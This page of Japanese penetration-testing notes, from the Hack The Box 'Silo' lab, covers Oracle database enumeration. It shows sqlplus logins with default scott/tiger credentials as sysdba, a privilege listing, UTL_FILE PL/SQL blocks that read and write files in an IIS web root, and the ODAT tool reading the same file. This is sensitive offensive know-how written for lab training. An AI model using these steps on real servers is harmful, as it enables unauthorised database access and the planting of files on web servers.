# Enum

----

## Manual
* **特権を有するユーザでも、特権を要するコマンドを実行する際はsysdbaでログインしなければならない**

* Htb: Silo

  ``` console
  ┌─[rio@parrot]─[~/Htb/Silo]
  └──╼ $sqlplus scott/tiger@10.129.168.112/XE
  
  SQL*Plus: Release 19.0.0.0.0 - Production on Thu Aug 19 17:22:16 2021
  Version 19.6.0.0.0
  
  Copyright (c) 1982, 2019, Oracle.  All rights reserved.
  
  ERROR:
  ORA-28002: the password will expire within 6 days
  
  
  
  Connected to:
  Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
  
  SQL> select * from session_privs;
  
  PRIVILEGE
  ----------------------------------------
  CREATE SESSION
  CREATE TABLE
  CREATE CLUSTER
  CREATE SEQUENCE
  CREATE PROCEDURE
  CREATE TRIGGER
  CREATE TYPE
  CREATE OPERATOR
  CREATE INDEXTYPE
  
  9 rows selected.
  
  ┌─[✗]─[rio@parrot]─[~/Htb/Silo]
  └──╼ $sqlplus scott/tiger@10.129.168.112/XE 'as sysdba'
  
  SQL*Plus: Release 19.0.0.0.0 - Production on Thu Aug 19 17:20:09 2021
  Version 19.6unknown command beginning "┌─[rio..." - rest of line ignored.
  .0.0.0
  
  Copyright (c) 1982, 2019, Oracle.  All rights reserved.
  
  
  Connected to:
  Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
  
  SQL> select * from session_privs;
  
  PRIVILEGE
  ----------------------------------------
  ALTER SYSTEM
  AUDIT SYSTEM
  CREATE SESSION
  ALTER SESSION
  RESTRICTED SESSION
  CREATE TABLESPACE
  ALTER TABLESPACE
  MANAGE TABLESPACE
  DROP TABLESPACE
  UNLIMITED TABLESPACE
  CREATE USER
  
  PRIVILEGE
  ----------------------------------------
  BECOME USER
  ALTER USER
  DROP USER
  CREATE ROLLBACK SEGMENT
  ALTER ROLLBACK SEGMENT
  DROP ROLLBACK SEGMENT
  CREATE TABLE
  CREATE ANY TABLE
  ALTER ANY TABLE
  BACKUP ANY TABLE
  DROP ANY TABLE
  
  PRIVILEGE
  ----------------------------------------
  LOCK ANY TABLE
  COMMENT ANY TABLE
  SELECT ANY TABLE
  INSERT ANY TABLE
  UPDATE ANY TABLE
  DELETE ANY TABLE
  CREATE CLUSTER
  CREATE ANY CLUSTER
  ALTER ANY CLUSTER
  DROP ANY CLUSTER
  CREATE ANY INDEX
  
  PRIVILEGE
  ----------------------------------------
  ALTER ANY INDEX
  DROP ANY INDEX
  CREATE SYNONYM
  CREATE ANY SYNONYM
  DROP ANY SYNONYM
  SYSDBA
  SYSOPER
  CREATE PUBLIC SYNONYM
  DROP PUBLIC SYNONYM
  CREATE VIEW
  CREATE ANY VIEW
  
  PRIVILEGE
  ----------------------------------------
  DROP ANY VIEW
  CREATE SEQUENCE
  CREATE ANY SEQUENCE
  ALTER ANY SEQUENCE
  DROP ANY SEQUENCE
  SELECT ANY SEQUENCE
  CREATE DATABASE LINK
  CREATE PUBLIC DATABASE LINK
  DROP PUBLIC DATABASE LINK
  CREATE ROLE
  DROP ANY ROLE
  
  PRIVILEGE
  ----------------------------------------
  GRANT ANY ROLE
  ALTER ANY ROLE
  AUDIT ANY
  ALTER DATABASE
  FORCE TRANSACTION
  FORCE ANY TRANSACTION
  CREATE PROCEDURE
  CREATE ANY PROCEDURE
  ALTER ANY PROCEDURE
  DROP ANY PROCEDURE
  EXECUTE ANY PROCEDURE
  
  PRIVILEGE
  ----------------------------------------
  CREATE TRIGGER
  CREATE ANY TRIGGER
  ALTER ANY TRIGGER
  DROP ANY TRIGGER
  CREATE PROFILE
  ALTER PROFILE
  DROP PROFILE
  ALTER RESOURCE COST
  ANALYZE ANY
  GRANT ANY PRIVILEGE
  CREATE MATERIALIZED VIEW
  
  PRIVILEGE
  ----------------------------------------
  CREATE ANY MATERIALIZED VIEW
  ALTER ANY MATERIALIZED VIEW
  DROP ANY MATERIALIZED VIEW
  CREATE ANY DIRECTORY
  DROP ANY DIRECTORY
  CREATE TYPE
  CREATE ANY TYPE
  ALTER ANY TYPE
  DROP ANY TYPE
  EXECUTE ANY TYPE
  UNDER ANY TYPE
  
  PRIVILEGE
  ----------------------------------------
  CREATE LIBRARY
  CREATE ANY LIBRARY
  ALTER ANY LIBRARY
  DROP ANY LIBRARY
  EXECUTE ANY LIBRARY
  CREATE OPERATOR
  CREATE ANY OPERATOR
  ALTER ANY OPERATOR
  DROP ANY OPERATOR
  EXECUTE ANY OPERATOR
  CREATE INDEXTYPE
  
  PRIVILEGE
  ----------------------------------------
  CREATE ANY INDEXTYPE
  ALTER ANY INDEXTYPE
  DROP ANY INDEXTYPE
  UNDER ANY VIEW
  QUERY REWRITE
  GLOBAL QUERY REWRITE
  EXECUTE ANY INDEXTYPE
  UNDER ANY TABLE
  CREATE DIMENSION
  CREATE ANY DIMENSION
  ALTER ANY DIMENSION
  
  PRIVILEGE
  ----------------------------------------
  DROP ANY DIMENSION
  MANAGE ANY QUEUE
  ENQUEUE ANY QUEUE
  DEQUEUE ANY QUEUE
  CREATE ANY CONTEXT
  DROP ANY CONTEXT
  CREATE ANY OUTLINE
  ALTER ANY OUTLINE
  DROP ANY OUTLINE
  ADMINISTER RESOURCE MANAGER
  ADMINISTER DATABASE TRIGGER
  
  PRIVILEGE
  ----------------------------------------
  MERGE ANY VIEW
  ON COMMIT REFRESH
  EXEMPT ACCESS POLICY
  RESUMABLE
  SELECT ANY DICTIONARY
  DEBUG CONNECT SESSION
  DEBUG ANY PROCEDURE
  FLASHBACK ANY TABLE
  GRANT ANY OBJECT PRIVILEGE
  CREATE EVALUATION CONTEXT
  CREATE ANY EVALUATION CONTEXT
  
  PRIVILEGE
  ----------------------------------------
  ALTER ANY EVALUATION CONTEXT
  DROP ANY EVALUATION CONTEXT
  EXECUTE ANY EVALUATION CONTEXT
  CREATE RULE SET
  CREATE ANY RULE SET
  ALTER ANY RULE SET
  DROP ANY RULE SET
  EXECUTE ANY RULE SET
  EXPORT FULL DATABASE
  IMPORT FULL DATABASE
  CREATE RULE
  
  PRIVILEGE
  ----------------------------------------
  CREATE ANY RULE
  ALTER ANY RULE
  DROP ANY RULE
  EXECUTE ANY RULE
  ANALYZE ANY DICTIONARY
  ADVISOR
  CREATE JOB
  CREATE ANY JOB
  EXECUTE ANY PROGRAM
  EXECUTE ANY CLASS
  MANAGE SCHEDULER
  
  PRIVILEGE
  ----------------------------------------
  SELECT ANY TRANSACTION
  DROP ANY SQL PROFILE
  ALTER ANY SQL PROFILE
  ADMINISTER SQL TUNING SET
  ADMINISTER ANY SQL TUNING SET
  CREATE ANY SQL PROFILE
  EXEMPT IDENTITY POLICY
  MANAGE FILE GROUP
  MANAGE ANY FILE GROUP
  READ ANY FILE GROUP
  CHANGE NOTIFICATION
  
  PRIVILEGE
  ----------------------------------------
  CREATE EXTERNAL JOB
  CREATE ANY EDITION
  DROP ANY EDITION
  ALTER ANY EDITION
  CREATE ASSEMBLY
  CREATE ANY ASSEMBLY
  ALTER ANY ASSEMBLY
  DROP ANY ASSEMBLY
  EXECUTE ANY ASSEMBLY
  EXECUTE ASSEMBLY
  CREATE MINING MODEL
  
  PRIVILEGE
  ----------------------------------------
  CREATE ANY MINING MODEL
  DROP ANY MINING MODEL
  SELECT ANY MINING MODEL
  ALTER ANY MINING MODEL
  COMMENT ANY MINING MODEL
  CREATE CUBE DIMENSION
  ALTER ANY CUBE DIMENSION
  CREATE ANY CUBE DIMENSION
  DELETE ANY CUBE DIMENSION
  DROP ANY CUBE DIMENSION
  INSERT ANY CUBE DIMENSION
  
  PRIVILEGE
  ----------------------------------------
  SELECT ANY CUBE DIMENSION
  CREATE CUBE
  ALTER ANY CUBE
  CREATE ANY CUBE
  DROP ANY CUBE
  SELECT ANY CUBE
  UPDATE ANY CUBE
  CREATE MEASURE FOLDER
  CREATE ANY MEASURE FOLDER
  DELETE ANY MEASURE FOLDER
  DROP ANY MEASURE FOLDER
  
  PRIVILEGE
  ----------------------------------------
  INSERT ANY MEASURE FOLDER
  CREATE CUBE BUILD PROCESS
  CREATE ANY CUBE BUILD PROCESS
  DROP ANY CUBE BUILD PROCESS
  UPDATE ANY CUBE BUILD PROCESS
  UPDATE ANY CUBE DIMENSION
  ADMINISTER SQL MANAGEMENT OBJECT
  ALTER PUBLIC DATABASE LINK
  ALTER DATABASE LINK
  FLASHBACK ARCHIVE ADMINISTER
  
  208 rows selected.
  ```
* utl_fileモジュールでファイルの読み書きが可能
* 出力を表示するためにはserveroutputをONに設定する必要がある
* **なお、一度に1024文字を超える文字列をファイルに書き込むことができないことに注意**

* Htb: Silo

  ```console
  ┌─[rio@parrot]─[~/Htb/Silo]
  └──╼ $sqlplus scott/tiger@10.129.168.112/XE
  
  SQL*Plus: Release 19.0.0.0.0 - Production on Thu Aug 19 17:29:21 2021
  Version 19.6.0.0.0
  
  Copyright (c) 1982, 2019, Oracle.  All rights reserved.
  
  ERROR:
  ORA-28002: the password will expire within 6 days
  
  
  
  Connected to:
  Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
  
  SQL> set serveroutput ON
  
  declare
    f utl_file.file_type;
    c varchar(3000);
  begin
    f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
    utl_file.get_line(f, c);
    utl_file.fclose(f);
    dbms_output.put_line(c);
  end;
  /
  
  SQL> SQL>   2    3    4    5    6    7    8    9   10  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
  
  PL/SQL procedure successfully completed.
  
  SQL> declare
    f utl_file.file_type;
  begin
    f := utl_file.fopen('/inetpub/wwwroot', 'test.txt', 'W');
    utl_file.put_line(f, 'test');
    utl_file.fclose(f);
  end;
  /
  
    2    3    4    5    6    7    8
  PL/SQL procedure successfully completed.
  ```


## Tool
* odatを利用
* 場合によってはsysdbaオプションが必要なことに注意
* Htb: Silo

  ```console
  ┌─[rio@parrot]─[~/Htb/Silo/odat]
  └──╼ $python3 odat.py utlfile -s 10.129.168.112 -U scott -P tiger -d XE --getFile /inetpub/wwwroot iisstart.htm iisstart.htm
  
  [1] (10.129.168.112:1521): Read the iisstart.htm file stored in /inetpub/wwwroot on the 10.129.168.112 server
  [-] Impossible to read the ['/inetpub/wwwroot', 'iisstart.htm', 'iisstart.htm'] file: `ORA-01031: insufficient privileges`
  ┌─[rio@parrot]─[~/Htb/Silo/odat]
  └──╼ $python3 odat.py utlfile -s 10.129.168.112 -U scott -P tiger -d XE --sysdba --getFile /inetpub/wwwroot iisstart.htm iisstart.htm
  
  [1] (10.129.168.112:1521): Read the iisstart.htm file stored in /inetpub/wwwroot on the 10.129.168.112 server
  [+] Data stored in the iisstart.htm file sored in /inetpub/wwwroot (copied in iisstart.htm locally):
  b'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\n<html xmlns="http://www.w3.org/1999/xhtml">\n<head>\n<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />\n<title>IIS Windows Server</title>\n<style type="text/css">\n<!--\nbody {\n\tcolor:#000000;\n\tbackground-color:#0072C6;\n\tmargin:0;\n}\n\n#container {\n\tmargin-left:auto;\n\tmargin-right:auto;\n\ttext-align:center;\n\t}\n\na img {\n\tborder:none;\n}\n\n-->\n</style>\n</head>\n<body>\n<div id="container">\n<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="iis-85.png" alt="IIS" width="960" height="600" /></a>\n</div>\n</body>\n</html>\n'
  ```

  